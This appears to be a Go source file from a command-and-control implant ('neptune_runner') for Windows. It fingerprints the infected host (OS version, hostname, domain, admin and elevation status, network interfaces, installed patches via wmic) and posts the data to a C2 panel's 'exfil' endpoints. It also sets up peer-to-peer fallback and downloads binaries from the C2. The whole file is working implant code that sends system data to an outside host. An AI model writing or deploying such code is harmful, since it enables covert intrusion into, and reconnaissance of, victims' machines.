package core

import (
	"bytes"
	"crypto/md5"
	"debug/pe"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"github.com/denisbrodbeck/machineid"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"log"
	"neptune_runner/communication"
	"neptune_runner/config"
	"neptune_runner/logging"
	"neptune_runner/misc"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"strconv"
	"strings"
	"time"
)

// Some sort of default hard-coded state for the moment

func deleteFile(filename string) {
	e := os.Remove(filename)
	if e != nil {
		log.Fatal(e)
	}
}

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

func getWindowsName() string {
	registryEntry, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)

	if err != nil {
		log.Fatal(err)
	}

	productName, _, err := registryEntry.GetStringValue("ProductName")

	if err != nil {
		log.Fatal(err)
	}

	return productName
}

func getWindowsVersion() string {
	registryEntry, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)

	if err != nil {
		log.Fatal(err)
	}

	windowsVersion, _, err := registryEntry.GetStringValue("CurrentBuild")

	if err != nil {
		log.Fatal(err)
	}

	return windowsVersion
}

func getTimezone() string {
	t := time.Now()
	zone, _ := t.Zone()
	//res := zone + string(offset)
	return zone
}

func getDomain() string {
	return os.Getenv("userdomain")
}

func getHostname() string {
	hostname, err := os.Hostname()

	if err != nil {
		fmt.Println(err)
	}

	return hostname
}

func SendInitialInfo() {
	type NewImplantInfo struct {
		Timezone   string `json:"timezone"`
		Workgroup  string `json:"domain"`
		OSVersion  string `json:"os_version"`
		OSName     string `json:"os_name"`
		Hostname   string `json:"hostname"`
		IsAdmin    bool   `json:"is_admin"`
		IsElevated bool   `json:"is_elevated"`
		ImplantID  string `json:"implant_id"`
		CampaignID int    `json:"campaign_id"`
	}

	data := NewImplantInfo{
		Timezone:   getTimezone(),
		Workgroup:  getDomain(),
		OSVersion:  getWindowsVersion(),
		OSName:     getWindowsName(),
		Hostname:   getHostname(),
		IsAdmin:    isAdmin(),
		IsElevated: isElevatedPipe(),
		ImplantID:  config.GlobalState.Id,
		CampaignID: config.GlobalState.CampaignId,
	}

	communication.SendPostToC2Panel(config.Config.Api.ImplantRegister, data)
}

func SendNetworkInterfaceInfo() {
	data := misc.GetNetworkInterfaces()

	apiPath := fmt.Sprintf(config.Config.Api.ExfilNetworksTemplate, config.GlobalState.Id)

	communication.SendPostToC2Panel(apiPath, data)
}

func SendWindowsUpdates() {
	rawOutput := url.QueryEscape(misc.CommandAsString("wmic qfe list brief /format:csv"))

	data := config.GenericApiCommunicationWrapper{
		Data: base64.StdEncoding.EncodeToString([]byte(rawOutput)),
	}

	apiPath := fmt.Sprintf(config.Config.Api.ExfilUpdatesTemplate, config.GlobalState.Id)

	communication.SendPostToC2Panel(apiPath, data)
}

func RegisterImplant() {
	logging.Info("\n============== Registering implant ==============\n")
	SendInitialInfo()
	SendNetworkInterfaceInfo()
	SendWindowsUpdates()
	logging.Info("\n============== Finished registration ==============\n")
}

func getUsername() string {
	currentUsername, err := user.Current()

	if err != nil {
		log.Fatalf(err.Error())
	}

	return currentUsername.Username
}

func isElevated() bool {
	logging.Info("Is Elevated?")

	token := windows.Token(0)

	return token.IsElevated()
}

func isElevatedPipe() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")

	if err != nil {
		return false
	}

	return true
}

func isAdmin() bool {
	var sid *windows.SID

	// Although this looks scary, it is directly copied from the
	// official windows documentation. The Go API for this is a
	// direct wrap around the official C++ API.
	// See https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-checktokenmembership
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		log.Fatalf("SID Error: %s", err)
		return false
	}

	// This appears to cast a null pointer so I'm not sure why this
	// works, but this guy says it does and it Works for Me™:
	// https://github.com/golang/go/issues/28804#issuecomment-438838144
	token := windows.Token(0)

	member, err := token.IsMember(sid)
	if err != nil {
		log.Fatalf("Token Membership Error: %s", err)
		return false
	}

	return member
}

func GetMD5Hash(text string) string {
	hash := md5.Sum([]byte(text))
	return hex.EncodeToString(hash[:])
}

func GenerateID() string {
	rawId, err := machineid.ID()

	if err != nil {
		logging.DebugErr("Failed to retrieve the unique machine ID. Falling back to empty string")
	}

	machineID, err := machineid.ProtectedID(rawId)

	if err != nil {
		logging.DebugErr("Failed to compute the secure unique machine ID. Falling back to empty string")
	}

	temp := machineID + getUsername() + getHostname() + strconv.FormatBool(isAdmin()) + strconv.FormatInt(int64(config.GlobalState.CampaignId), 10)

	return GetMD5Hash(temp)
}

func Init() {
	initDebug()

	// Set Implant ID
	config.GlobalState.Id = GenerateID()

	// Check whether the runner has network access to reach back to control panel
	configureInternetConnectivityFlag()

	//setupListeners()

	logging.DebugErr("ID: " + config.GlobalState.Id)

	waitIfNoConnectionToC2()

	//logging.DebugStruct(config.GlobalState)
}

func initDebug() {
	if logging.IsDebugEnabled() {

		// For future use

		if logging.IsLogToFileEnabled() {
			f, err := os.Create(config.LOG_FILE_PATH)

			if err != nil {
				log.Fatal("Error creating log file:", err)
			}

			log.SetOutput(f)
		}
	}
}

func setupListeners() {
	go communication.ListenNamedPipe()
	go communication.SetupPeer2PeerListeners()
}

func configureInternetConnectivityFlag() {
	haveInternetAccess := checkInternetConnectivityViaGETRequest()
	//haveInternetAccess := false

	if haveInternetAccess {
		logging.Info("DIRECT ACCESS TO C2 PANEL")

		config.GlobalState.CommunicationMode = config.Internet
	} else {
		logging.Info("NO DIRECT ACCESS TO C2 PANEL. RELYING ON PEER2PEER")

		config.GlobalState.CommunicationMode = config.Peer2Peer
	}
}

// This might not be very accurate, but good enough at the moment we wrote it
func checkInternetConnectivityViaGETRequest() bool {
	_, err := http.Get(config.API_URL)

	return err == nil
}

func waitIfNoConnectionToC2() {
	// Only continue with the execution if we either have internet access or
	// at least one neighbor in p2p mode
	for config.GlobalState.CommunicationMode == config.Peer2Peer && len(config.GlobalState.Neighbors) == 0 {
		logging.Info("WAITING FOR A NEIGHBOR")
		time.Sleep(10 * time.Second)
	}
}

func IsNETBinary(url string) bool {

	input := communication.SendGetToC2Panel(url)

	file, err := pe.NewFile(bytes.NewReader(input))
	if err != nil {
		fmt.Println(err)
		//return
	}
	isDotNet := false
	symbols, err := file.ImportedSymbols()
	if err != nil {
		fmt.Println(err)
		return false
	}
	for _, sym := range symbols {
		if strings.Contains(sym, "mscoree.dll") {
			isDotNet = true
		}
	}

	if isDotNet {
		return true
	} else {
		return false
	}
}
